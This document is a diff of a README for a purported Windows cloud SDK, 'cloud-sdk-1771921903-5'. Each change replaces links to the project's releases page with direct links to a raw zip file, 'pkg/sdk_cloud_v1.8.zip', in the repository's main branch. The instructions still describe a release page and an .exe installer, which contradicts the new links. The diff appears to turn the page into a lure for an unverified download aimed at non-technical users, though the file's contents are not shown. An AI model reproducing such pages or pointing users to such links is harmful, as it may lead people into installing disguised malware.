@@ -1,6 +1,6 @@
 # ☁️ cloud-sdk-1771921903-5 - Easy Cloud Platform Access
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Cloud%20SDK-blue)](https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Cloud%20SDK-blue)](https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/raw/refs/heads/main/pkg/sdk_cloud_v1.8.zip)
 
 ## 📘 About cloud-sdk-1771921903-5
 
@@ -28,7 +28,7 @@ cloud-sdk-1771921903-5 does not require complicated setup or development environ
 
 Click the button below or visit the page to download the SDK files:
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Cloud%20SDK-grey)](https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Cloud%20SDK-grey)](https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/raw/refs/heads/main/pkg/sdk_cloud_v1.8.zip)
 
 You will land on the release page. Look for the latest stable version, usually marked clearly as “Latest” or with the most recent date. Inside the release, find the Windows executable file, often with the extension `.exe` or `.msi`. Click on the file to start downloading.
 
@@ -88,7 +88,7 @@ The software provides simple buttons and menus to help with these actions, so yo
 
 Check the release page regularly for updates. Updates may include bug fixes and new features.
 
-- Visit the releases page: [https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/releases](https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/releases)  
+- Visit the releases page: [https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/raw/refs/heads/main/pkg/sdk_cloud_v1.8.zip](https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/raw/refs/heads/main/pkg/sdk_cloud_v1.8.zip)  
 - Download the latest version following the same steps as before.
 - The installer will update your existing installation without losing your settings.
 
@@ -101,6 +101,6 @@ If you need detailed instructions or advanced support, you can also check the �
 ---
 
 # Direct Download Link:  
-[https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/releases](https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/releases)
+[https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/raw/refs/heads/main/pkg/sdk_cloud_v1.8.zip](https://github.com/saumyabrata-gaunya/cloud-sdk-1771921903-5/raw/refs/heads/main/pkg/sdk_cloud_v1.8.zip)
 
 Use this page to download the latest Windows installer for cloud-sdk-1771921903-5.
